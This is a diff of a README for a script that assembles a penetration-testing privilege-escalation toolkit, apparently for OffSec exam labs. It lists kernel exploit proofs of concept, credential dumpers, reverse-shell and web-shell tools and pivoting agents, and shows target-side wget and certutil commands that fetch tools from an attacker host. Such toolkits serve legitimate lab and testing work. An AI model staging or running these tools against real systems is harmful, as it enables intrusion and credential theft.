@@ -19,20 +19,19 @@ It also ships an `EXAM-RESTRICTED-TOOLS.txt` reminder of OffSec's exam rules.
 
 The script creates a toolkit tree (default `~/privesc-toolkit`) and populates these categories:
 
-**Linux**
-- Enumeration: LinPEAS, linux-smart-enumeration (lse), LinEnum, linux-exploit-suggester, unix-privesc-check (staged from the Kali package as a low-priority cross-check)
-- Process monitoring: pspy
-- Networking / shells: static busybox, netcat helpers
-- Kernel exploits: DirtyPipe, PwnKit, and CopyFail (CVE-2026-31431) proof-of-concept, hash-verified
-- Pivoting: chisel, ligolo-ng proxy/agent
+**Linux** (`linux/`)
+- `enum/` — LinPEAS, linux-smart-enumeration (lse), LinEnum, linux-exploit-suggester, unix-privesc-check, pspy
+- `shells/` — static busybox, netcat helpers
+- `exploits/` — DirtyPipe, PwnKit, and CopyFail (CVE-2026-31431) proof-of-concept (hash-verified)
+- `pivot/` — chisel, ligolo-ng proxy/agent
 
-**Windows**
-- Enumeration: WinPEAS, PrivescCheck, PowerUp, Seatbelt, SharpUp, accesschk (official signed Sysinternals build)
-- Privilege escalation: GodPotato, PrintSpoofer, JuicyPotato / JuicyPotatoNG, RoguePotato, SigmaPotato, FullPowers
-- Credential dumping: mimikatz, LaZagne, KeePass and McAfee sitelist decryptors
-- Active Directory: Rubeus, Certify, kerbrute, SharpHound / BloodHound CE, plus SharpCollection (a nightly-built superset of the .NET binaries across runtimes)
-- Networking / shells: nc64, Invoke-PowerShellTcp, Invoke-ConPtyShell (fully interactive PTY for shell stabilization), PsExec64 (official signed Sysinternals build)
-- Pivoting: chisel and ligolo-ng agents
+**Windows** (`windows/`)
+- `enum/` — WinPEAS, PrivescCheck, PowerUp, Seatbelt, SharpUp, accesschk (official signed Sysinternals build)
+- `privesc/` — GodPotato, PrintSpoofer, JuicyPotato / JuicyPotatoNG, RoguePotato, SigmaPotato, FullPowers
+- `creds/` — mimikatz, LaZagne, KeePass and McAfee sitelist decryptors
+- `ad/` — Rubeus, Certify, kerbrute, SharpHound / BloodHound CE, plus SharpCollection (a nightly-built superset of the .NET binaries across runtimes)
+- `shells/` — nc64, Invoke-PowerShellTcp, Invoke-ConPtyShell (fully interactive PTY for shell stabilization), PsExec64 (official signed Sysinternals build)
+- `pivot/` — chisel and ligolo-ng agents
 
 **Web / attacker-side**
 - Web shells in multiple languages (php, phtml, phar, aspx, asp, jsp)
@@ -98,10 +97,10 @@ On the target:
 
 ```bash
 # Linux
-wget http://<LHOST>:8000/linux/linpeas.sh -O /tmp/linpeas.sh
+wget http://<LHOST>:8000/linux/enum/linpeas.sh -O /tmp/linpeas.sh
 
 # Windows
-certutil -urlcache -f http://<LHOST>:8000/windows/winPEASx64.exe winpeas.exe
+certutil -urlcache -f http://<LHOST>:8000/windows/enum/winPEASx64.exe winpeas.exe
 ```
 
 The generated `README-FIRST` file inside the toolkit lists the most-used target-side URLs and a suggested workflow.
